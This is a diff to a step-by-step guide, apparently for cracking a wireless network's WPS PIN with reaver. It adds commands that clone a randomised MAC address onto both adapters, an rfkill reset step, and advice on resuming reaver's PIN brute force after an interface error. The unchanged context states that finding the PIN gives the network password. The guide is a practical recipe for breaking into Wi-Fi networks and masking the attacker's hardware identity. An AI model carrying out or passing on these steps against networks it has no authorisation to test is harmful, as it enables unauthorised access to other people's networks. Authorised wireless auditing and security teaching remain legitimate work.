@@ -31,9 +31,11 @@ You'll need
     Turn off adapters
     # ifconfig $w down
     # ifconfig $m down
-    Change MAC to whatever you like
+    Change MAC to whatever you like, but both adapter need to have the same MAC
+    address
     # macchanger -r $w
-    # macchanger -r $m
+    # mac=$(ifconfig -a | sed -n "/${w}/{n; s/.*ether \([^ ]*\).*/\1/p}")
+    # macchanger -m $mac $m
     Turn the adapters on again
     # ifconfig $w up
     # ifconfig $m up
@@ -56,6 +58,9 @@ You'll need
     https://aur.archlinux.org/packages/reaver/ or
     https://forums.kali.org/showthread.php?89-Problem-with-wash for more
     information.
+    If it doesn't work, you can also try to reenable the wireless devices
+    # rfkill block wifi
+    # rfkill unblock wifi
 
  6) Crack the WPS pin
     # reaver -i $m -b $bssid -c $channel -a -S -N -vv
@@ -67,3 +72,7 @@ You'll need
     again.
     Reaver needs to try ~11000 pins. If you find the correct pin, you'll have
     the password. This can take anything from seconds to hours.
+    If you get an error message
+    > [-] Failed to re-initialize interface 'mon0'
+    you might have to start all over again. But reaver should have saved the
+    progress and be able to continue from where you left off.
